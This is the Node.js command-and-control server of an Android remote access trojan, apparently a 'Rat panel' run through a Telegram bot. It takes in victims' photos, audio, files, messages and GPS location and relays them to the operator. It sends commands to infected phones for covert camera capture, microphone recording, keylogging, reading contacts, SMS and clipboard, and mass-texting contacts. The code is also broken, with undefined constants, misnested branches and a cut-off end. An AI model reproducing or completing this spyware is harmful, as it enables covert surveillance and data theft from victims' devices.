const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const stream = require('stream');

const token = process.env.TOKEN;
const id = process.env.ID;
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new WebSocket.Server({ server: appServer, perMessageDeflate: true }); // Habilitar compresión de mensajes WebSocket
const appBot = new TelegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

const REPLY_MESSAGE_NUMBER = '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎';
const REPLY_MESSAGE_TEXT = '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧';
const PROCESSING_MESSAGE = '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
                           '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ';

const START = '°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n' +
                '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
                '• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ';
                                           
const KEYBOARD_OPTIONS = {
    parse_mode: "HTML",
    reply_markup: {
        keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
        resize_keyboard: true
    }
};

app.get('/', function (req, res) {
  res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>');
});

app.post("/uploadImage", upload.single('file'), async (req, res) => {
  try {
    const name = req.file.originalname;
    const fileStream = new stream.PassThrough();
    fileStream.end(req.file.buffer);
    await appBot.sendPhoto(id, fileStream, {
      caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
      parse_mode: "HTML"
    }, {
      contentType: 'image/*',
      filename: name
    });
    res.send('');
  } catch (err) {
    console.error('Error al enviar la imagen:', err);
    res.status(500).send('Error al enviar la imagen');
  }
});

app.post("/uploadAudio", upload.single('file'), async (req, res) => {
  try {
    const name = req.file.originalname;
    const fileStream = new stream.PassThrough();
    fileStream.end(req.file.buffer);
    await appBot.sendAudio(id, fileStream, {
      caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
      parse_mode: "HTML"
    }, {
      contentType: 'audio/*',
      filename: name
    });
    res.send('');
  } catch (err) {
    console.error('Error al enviar el audio:', err);
    res.status(500).send('Error al enviar el audio');
  }
});

app.post("/uploadFile", upload.single('file'), async (req, res) => {
  try {
    const name = req.file.originalname;
    const fileStream = new stream.PassThrough();
    fileStream.end(req.file.buffer);
    await appBot.sendDocument(id, fileStream, {
      caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
      parse_mode: "HTML"
    }, {
      filename: name,
      contentType: 'application/txt',
    });
    res.send('');
  } catch (err) {
    console.error('Error al enviar el archivo:', err);
    res.status(500).send('Error al enviar el archivo');
  }
});

app.post("/uploadText", async (req, res) => {
  try {
    await appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], { parse_mode: "HTML" });
    res.send('');
  } catch (err) {
    console.error('Error al enviar el texto:', err);
    res.status(500).send('Error al enviar el texto');
  }
});

app.post("/uploadLocation", async (req, res) => {
  try {
    await appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    await appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, { parse_mode: "HTML" });
    res.send('');
  } catch (err) {
    console.error('Error al enviar la ubicación:', err);
    res.status(500).send('Error al enviar la ubicación');
  }
});

appSocket.on('connection', (ws, req) => {
  const uuid = uuid4.v4();
  const model = req.headers.model;
  const battery = req.headers.battery;
  const version = req.headers.version;
  const brightness = req.headers.brightness;
  const audio_mode = req.headers.audio_mode;
  const provider = req.headers.provider;

  ws.uuid = uuid;
  appClients.set(uuid, {
    model: model,
    battery: battery,
    version: version,
    brightness: brightness,
    audio_mode: audio_mode,
    provider: provider
  });

  appBot.sendMessage(id,
    `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
    `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
    `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
    `• ᴀᴜᴅɪᴏ ᴍᴏᴅᴇ: <b>${audio_mode}</b>\n` +
    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
    { parse_mode: "HTML" }
  );

  ws.on('close', function () {
    appBot.sendMessage(id,
      `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
      `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
      `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
      `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
      `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
      `• ᴀᴜᴅɪᴏ ᴍᴏᴅᴇ: <b>${audio_mode}</b>\n` +
      `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
      { parse_mode: "HTML" }
    );
    appClients.delete(ws.uuid);
  });
});

appBot.on('message', (message) => {
  const chatId = message.chat.id;
  const replyToMessage = message.reply_to_message?.text || '';
  
  const sendProcessingMessage = () => {
      appBot.sendMessage(chatId, PROCESSING_MESSAGE, KEYBOARD_OPTIONS);
  };

  const sendMessageToSocketClients = (command) => {
      appSocket.clients.forEach((ws) => {
          if (ws.uuid === currentUuid) {
              ws.send(command);
          }
      });
      currentUuid = '';
      sendProcessingMessage();
  };

  const isMatchingReply = (text, match) => text.includes(match);

  if (message.reply_to_message) {
      if (isMatchingReply(replyToMessage, REPLY_MESSAGE_NUMBER)) {
          currentNumber = message.text;
          appBot.sendMessage(chatId, REPLY_MESSAGE_TEXT, { reply_markup: { force_reply: true } });
      } else if (isMatchingReply(replyToMessage, REPLY_MESSAGE_TEXT)) {
          sendMessageToSocketClients(`send_message:${currentNumber}/${message.text}`);
          currentNumber = '';
      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
          sendMessageToSocketClients(`send_message_to_all:${message.text}`);
      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
          sendMessageToSocketClients(`microphone:${message.text}`);
      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
          sendMessageToSocketClients(`toast:${message.text}`);
      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
          currentTitle = message.text;
          appBot.sendMessage(chatId, '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', { reply_markup: { force_reply: true } });
      } else if (isMatchingReply(replyToMessage, '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
          sendMessageToSocketClients(`show_notification:${currentTitle}/${message.text}`);
      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙫𝙞𝙗𝙧𝙖𝙩𝙚')) {
          sendMessageToSocketClients(`vibrate:${message.text}`);
      } else if (isMatchingReply(replyToMessage, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮')) {
          sendMessageToSocketClients(`play_audio:${message.text}`);
      }
  }

  if (id == chatId) {
      if (message.text == '/start') {
          appBot.sendMessage(chatId, START, KEYBOARD_OPTIONS);
      } else if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
          if (appClients.size == 0) {
              appBot.sendMessage(chatId,
                  '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                  '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
              );
          } else {
            let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
            appClients.forEach(function (value, key, map) {
                text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                    `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
            })
            appBot.sendMessage(id, text, {parse_mode: "HTML"})
          }
          if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    }else {
        appBot.sendMessage(id, '°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙')
      }
      } else if (message.text == '𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨') {
          appBot.sendMessage(chatId, REPLY_MESSAGE_MESSAGE_TO_ALL, { reply_markup: { force_reply: true } });
      } else if (message.text == '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚') {
          appBot.sendMessage(chatId, REPLY_MESSAGE_NUMBER, { reply_markup: { force_reply: true } });
      } else if (message.text == '𝘾𝙖𝙡𝙡𝙨') {
          sendMessageToSocketClients('calls');
      } else if (message.text == '𝙎𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩') {
          sendMessageToSocketClients('screenshot');
      } else if (message.text == '𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨') {
          sendMessageToSocketClients('contacts');
      } else if (message.text == '𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨') {
          sendMessageToSocketClients('messages');
      } else if (message.text == '𝘼𝙥𝙥𝙨') {
          sendMessageToSocketClients('apps');
      } else if (message.text == '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤') {
          sendMessageToSocketClients('device_info');
      } else if (message.text == '𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙') {
          sendMessageToSocketClients('clipboard');
      } else if (message.text == '𝙎𝙚𝙣𝙙 𝙠𝙚𝙮') {
          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙠𝙚𝙮 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙥𝙧𝙚𝙨𝙨𝙚𝙙', { reply_markup: { force_reply: true } });
      } else if (message.text == '𝘾𝙖𝙢𝙚𝙧𝙖 𝙢𝙖𝙞𝙣') {
          sendMessageToSocketClients('camera_main');
      } else if (message.text == '𝘾𝙖𝙢𝙚𝙧𝙖 𝙨𝙚𝙡𝙛𝙞𝙚') {
          sendMessageToSocketClients('camera_selfie');
      } else if (message.text == '𝙂𝙋𝙎 𝙡𝙤𝙘𝙖𝙩𝙞𝙤𝙣') {
          sendMessageToSocketClients('gpsLocation');
      } else if (message.text == '𝙇𝙞𝙨𝙩𝙚𝙣𝙚𝙧 𝙤𝙣') {
          sendMessageToSocketClients('listeneron');
      } else if (message.text == '𝙇𝙞𝙨𝙩𝙚𝙣𝙚𝙧 𝙤𝙛𝙛') {
          sendMessageToSocketClients('listeneroff');
      } else if (message.text == '𝙑𝙞𝙗𝙧𝙖𝙩𝙚') {
          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙫𝙞𝙗𝙧𝙖𝙩𝙚', { reply_markup: { force_reply: true } });
      } else if (message.text == '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤') {
          appBot.sendMessage(chatId, REPLY_MESSAGE_AUDIO, { reply_markup: { force_reply: true } });
      } else if (message.text == '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤') {
          sendMessageToSocketClients('stop_audio');
      } else if (message.text == '𝙎𝙚𝙣𝙙 𝙩𝙤𝙖𝙨𝙩') {
          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚', { reply_markup: { force_reply: true } });
      } else if (message.text == '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣') {
          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', { reply_markup: { force_reply: true } });
      } else if (message.text == '𝙍𝙚𝙘𝙤𝙧𝙙 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚') {
          appBot.sendMessage(chatId, '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙', { reply_markup: { force_reply: true } });
      }
  }
);


appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];
    console.log(uuid);
    if (command == 'device') {
        appBot.editMessageText(`°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: '𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤', callback_data: `device_info:${uuid}` }, { text: '𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚', callback_data: `microphone:${uuid}` }],
                    [{ text: '𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_main:${uuid}` }, { text: '𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖', callback_data: `camera_selfie:${uuid}` }],
                    [{ text: '𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `gpsLocation:${uuid}` }, { text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}` }],
                    [{ text: '𝙑𝙞𝙗𝙧𝙖𝙩𝙚', callback_data: `vibrate:${uuid}` }, { text: '𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣', callback_data: `show_notification:${uuid}` }],
                    [{ text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', callback_data: `send_message:${uuid}` }, { text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨', callback_data: `send_message_to_all:${uuid}` }],
                    [{ text: '𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}` }, { text: '𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}` }],
                    [{ text: '𝙂𝙚𝙩𝙆𝙚𝙮𝙇𝙤𝙜', callback_data: `sendkey:${uuid}` }, { text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙊𝙣', callback_data: `listeneron:${uuid}` }, { text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙊𝙛𝙛', callback_data: `listeneroff:${uuid}` }],
                ]
            },
            parse_mode: "HTML"
        });
    }

    function sendMessageThroughSocket(uuid, message) {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid === uuid) {
                ws.send(message);
            }
        });
    }

    appBot.deleteMessage(id, msg.message_id);

    switch (command) {
            case 'device_info':
            case 'camera_main':
            case 'gpsLocation':            
            case 'vibrate':                        
            case 'sendkey':            
            case 'camera_selfie':
            case 'listeneron':
            case 'listeneroff':            
                case 'play_audio':
                    appBot.deleteMessage(id, msg.message_id)
                    appBot.sendMessage(id,
                        '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮\n\n' +
                        '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
                        {reply_markup: {force_reply: true}, parse_mode: "HTML"}
                    )
                    currentUuid = uuid
                    break;
                case 'stop_audio':
                    sendMessageThroughSocket(uuid, command);
                    appBot.sendMessage(id,
                        '°• 𝙔𝙤𝙪𝙧 𝙖𝙪𝙙𝙞𝙤 𝙝𝙖𝙨 𝙨𝙩𝙤𝙥𝙥𝙚𝙙.\n\n' +
                        '• 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙨𝙩𝙖𝙧𝙩 𝙖𝙣𝙤𝙩𝙝𝙚𝙧 𝙖𝙪𝙙𝙞𝙤 𝙤𝙧 𝙚𝙣𝙟𝙤𝙮 𝙤𝙩𝙝𝙚𝙧 𝙖𝙘𝙩𝙞𝙤𝙣𝙨',
                        {
                            parse_mode: "HTML",
                            "reply_markup": {
                                "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]]
                            }
                        }
                    );
                    break;
                case 'send_message':
                    appBot.deleteMessage(id, msg.message_id)
                    appBot.sendMessage(id, '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
                        '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
                        {reply_markup: {force_reply: true}})
                    currentUuid = uuid
                    break;
                case 'send_message_to_all':
                    appBot.deleteMessage(id, msg.message_id)
                    appBot.sendMessage(id,
                        '𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
